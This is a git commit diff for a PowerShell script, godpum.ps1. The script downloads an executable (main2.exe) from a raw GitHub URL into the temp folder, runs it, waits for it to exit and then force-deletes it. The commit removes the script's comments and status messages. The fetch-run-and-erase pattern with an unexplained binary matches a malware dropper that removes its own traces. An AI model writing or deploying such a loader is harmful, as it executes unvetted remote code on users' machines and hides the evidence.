2a8b930eb3e8b7413673970f92b84b2662a186a5
lubyralph6-maker <lubyralph6@gmail.com>
2026-05-28 15:48:56 +0700

    Update godpum.ps1

--- godpum.ps1
+++ godpum.ps1
@@ -1,23 +1,13 @@
-# ===== CONFIG =====
 $exeUrl = "https://raw.githubusercontent.com/lubyralph6-maker/godpum.ps1/main/main2.exe"
 
-# ===== TEMP PATH =====
-$tempExe = "$env:TEMP\main2.exe"
+$tempExe = Join-Path $env:TEMP "main2.exe"
 
-# ===== DOWNLOAD =====
 Invoke-WebRequest -Uri $exeUrl -OutFile $tempExe
 
-# ===== CHECK =====
+$proc = Start-Process $tempExe -PassThru
+
+$proc.WaitForExit()
+
 if (Test-Path $tempExe) {
-
-    Write-Host "Downloaded"
-
-    # ===== RUN =====
-    Start-Process $tempExe
-
-}
-else {
-
-    Write-Host "Download failed"
-
+    Remove-Item $tempExe -Force
 }
